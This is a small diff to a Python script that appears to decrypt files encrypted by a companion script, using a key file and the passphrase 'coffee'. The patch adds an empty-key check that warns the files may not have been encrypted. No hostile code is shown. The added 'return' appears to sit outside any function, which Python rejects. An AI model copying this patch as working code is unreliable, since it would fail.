@@ -16,6 +16,9 @@ print(files)
 
 with open("thekey.key", "rb") as key:
 	thekey = key.read()
+	if len(thekey) == 0:
+		print("No Key available. REMINDER: Did you forget to encrypt the files?")
+		return
 
 secretphrase = "coffee"
 
